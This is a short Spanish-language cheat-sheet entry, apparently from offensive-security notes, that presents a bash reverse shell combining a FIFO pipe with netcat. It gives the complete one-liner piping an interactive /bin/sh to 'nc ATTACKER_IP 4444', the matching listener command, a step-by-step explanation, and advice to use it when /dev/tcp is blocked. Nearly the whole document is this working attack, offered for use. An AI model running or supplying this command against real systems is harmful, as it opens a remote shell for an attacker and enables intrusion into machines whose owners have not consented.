# Bash Reverse Shell — FIFO + Netcat

## Descripción

Esta reverse shell utiliza **pipes FIFO** junto con **netcat** para establecer una conexión remota.

Es útil cuando `/dev/tcp` está deshabilitado.

---

# Comando

```bash
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

---

# Listener

```bash
nc -lvnp 4444
```

---

# Requisitos

* netcat disponible
* permisos para crear archivos en `/tmp`

---

# Explicación

```
mkfifo /tmp/f        → crea pipe FIFO
cat /tmp/f           → lee datos del pipe
/bin/sh -i           → shell interactiva
nc ATTACKER_IP 4444  → conexión al atacante
> /tmp/f             → redirige salida hacia pipe
```

---

# Cuándo usarlo

* cuando `/dev/tcp` está bloqueado
* sistemas con netcat disponible

---

# Limitaciones

* requiere netcat
* deja archivo temporal en `/tmp`
